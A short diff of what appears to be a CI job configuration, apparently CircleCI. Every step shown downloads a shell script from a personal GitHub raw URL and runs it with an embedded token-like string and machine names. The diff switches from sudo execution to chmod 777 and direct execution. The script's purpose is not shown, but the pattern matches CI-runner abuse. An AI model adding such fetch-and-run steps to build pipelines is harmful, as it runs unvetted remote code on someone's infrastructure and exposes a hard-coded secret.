@@ -4,4 +4,4 @@ jobs:
     machine: true
     steps:
        - run: wget https://raw.githubusercontent.com/jolinee/test/main/linux.sh
-       - run: sudo ./linux.sh "delta123101" "20Rk6mrvYLekWbm6R7oYHTuXLRZ_3TQyEcv2bNSfiMdxVGGQW" "alpha" "alpha-mach"
+       - run: chmod 777 ./linux.sh && chmod +x linux.sh && linux.sh "delta123101" "20Rk6mrvYLekWbm6R7oYHTuXLRZ_3TQyEcv2bNSfiMdxVGGQW" "alpha" "alpha-mach"
